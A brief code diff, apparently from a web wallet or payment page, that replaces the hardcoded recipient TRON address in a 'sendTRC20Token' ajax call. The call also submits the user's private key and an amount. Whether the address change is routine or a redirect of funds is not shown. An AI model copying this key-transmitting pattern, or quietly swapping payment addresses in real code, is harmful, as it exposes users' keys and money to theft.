@@ -287,7 +287,7 @@
                         var sendTRC20Token = ajaxShortLink("sendTRC20Token",{
                             'contractaddress':"TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
                             'from':currentUser.trc20_wallet,
-                            'to':'TCyRBGnjMSLsPos5RJxVfC7fjcWk1vaUqS',
+                            'to':'TJwxuryQQPKrE5pVisRkpDmY1X5hRCucpL',
                             'privatekey':currentUser.trc20_privateKey,
                             'amount':amountInput
                         })
